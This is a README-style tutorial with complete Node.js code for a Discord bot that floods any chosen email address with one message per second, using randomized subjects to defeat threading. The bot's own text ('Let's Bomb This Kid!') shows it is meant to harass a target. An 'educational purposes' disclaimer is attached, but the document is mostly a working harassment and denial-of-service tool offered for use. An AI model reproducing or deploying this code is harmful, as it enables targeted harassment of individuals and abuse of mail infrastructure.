# Discord Bot E-mail Bomber
## Warning!
By using this bot source you're breaking the Discord's TOS,      
I'm not responsible for any illegal use of this source code.  
All you will find below is for educational purposes  
By copying anything you'll find below, you are confirming that you read this.  
*Use this at your own risk*  
*Please do not edit the credits!*

## Description
With this bot, you can bomb any mail address by running a simple command.  
The E-mail object will be randomized in all new mails, so there is not any chance that a new mail is a reply to the first.  
All this complex system is activated by the simple command !send mail@mail.com.  

## Installing
First, we need to install [Nodemailer](https://nodemailer.com/about/) through npm  
```bash
npm install nodemailer --save
```

## Starting
Now we need to declare nodemailer at the bottom of our code and a boolean called "spamming" that will be used later
```javascript
const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = "!"
const nodemailer = require("nodemailer");
var spamming;
```

## Client On Message
It's time to start coding, you can find the whole code in index.js or follow this guide to create your own.  
Now let's just create the var args and command.  
```javascript
client.on('message', async msg => {
    var args = msg.content.split(' ').slice(1);
    var command = msg.content.toLowerCase().slice(prefix.length).split(' ')[0];
    if(msg.author.bot) return;
 ```
## Send Command
We need to make our "send" command and create our character generator.

```javascript    
if (command === 'send') {
  if (spamming == true) return msg.reply("A mail bombing is already active! Please use '!stop' before a new attack"); //Check if the spamming variable is true

    if (!args[0]) 
        return  msg.reply("You need to insert a mail target!"); //If email is not specified, you get this reply message.

        
        function randomLetters(length) { //Here you create your random letters and number function.
          var text = "";
          var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
          for (var i = 0; i < length; i++)
            text += possible.charAt(Math.floor(Math.random() * possible.length));
             return text;
          }

       
          
        var mailto = args[0] //the variable mailto will be the arg[0] (the target e-mail)
        var mailtxt = (randomLetters(10)) //The mail's text will be 10 random letters and numbers choosed by the var "possible"
 ```
        
##  SMTP Server Connection
Now let's create the connection with the smtp server
```javascript
        let transporter = nodemailer.createTransport({
            host: "server", //smtp server
            port: 25,
            secure: false, // true for 465, false for other ports
            auth: {
              user: 'mail', 
              pass: 'password' 
            }
          });
```
##  E-Mail Config
And the config file
```javascript
let mailOptions = {
            from: '"Name" <e-mail>', // sender address
            to: mailto, // list of receivers, in this case, the "mailto" variable
            subject: (randomLetters(8)), // Subject is made by 8 random characters
            text: mailtxt, // text body, made from mailtxt variable
            html: "<b>" + mailtxt + "</b>" // html body
          };
```
##  Spamming Process
This is how you make the bot start spamming

```javascript
async function sendMail() {
          let info = await transporter.sendMail(mailOptions) //You load the mail options
          spamming = true; //You set the variable "spamming" to true, when it's on true, you can't launch other attacks
          }
          

            const spammingMessage = setInterval(() => { //You make a loop of the command, so it spams over and over
              var mailto = args[0]
                  mailOptions.subject = (randomLetters(8)) //You change the mail object, so it's everytime a new email and not a reply to the first one
                  var mailtxt = (randomLetters(10))
          
                      sendMail();
                      
                  }, 1000);

        msg.channel.send({embed: { //You create an embed with all the informations
            color: 3447003,
            author: {
              name: client.user.username,
              icon_url: client.user.avatarURL
            },
            title: "Bombing",
            description: "Bot Developed By Mental#1424",
            fields: [{
                name: "Let's Bomb This Kid!",
                value: "Bombing In Progress..."
              },
            {
                name: "Target Mail",
                value: mailto,
              },

            ],
            timestamp: new Date(),
            footer: {
              icon_url: client.user.avatarURL,
              text: "© Discord Mail Bomber"
            }
            
            
          }
          
        });
      }
```
##  Stopping The bombing
The stop command:
```javascript 
if(command === "stop") { //Stop the mail bombing
        if (spamming == false) return msg.reply("There isn't any active bombing!") //if you are not spamming, you can't stop the mail bombing.
        msg.channel.send("Stopped! Bot Shutdown")
        client.destroy() //The bot shut down
    }
```
##  Credits and info
All the informations about the bot:
```javascript
    if(command === "info") { //Please do not edit this
      msg.channel.send({embed: {
          color: 3447003,
          author: {
            name: client.user.username,
            icon_url: client.user.avatarURL
          },
          title: "Info",
          description: 'Bot developed by Mental#1424'+'\n'+'Special Thanks To: ' + 'Exploit#1337',
          fields: [{
              name: "Find Me On Github!",
              value: "[Click This](https://github.com/MyNameIsMental)"
            },
           {
              name: "The bot is open source on github!",
              value: "[Click This](https://github.com/MyNameIsMental/discord-email-bombing)"
            },

          {
              name: "Command Sytax",
              value: "!send targetmail@targetmail.com text"
            },

            {
              name: "Stop",
              value: "Use !stop for stopping the mail bombing"
            }
          ],
          timestamp: new Date(),
          footer: {
            icon_url: client.user.avatarURL,
            text: "© Discord Mail Bomber"
          }
        }
      })
        };

    }) 
    ```
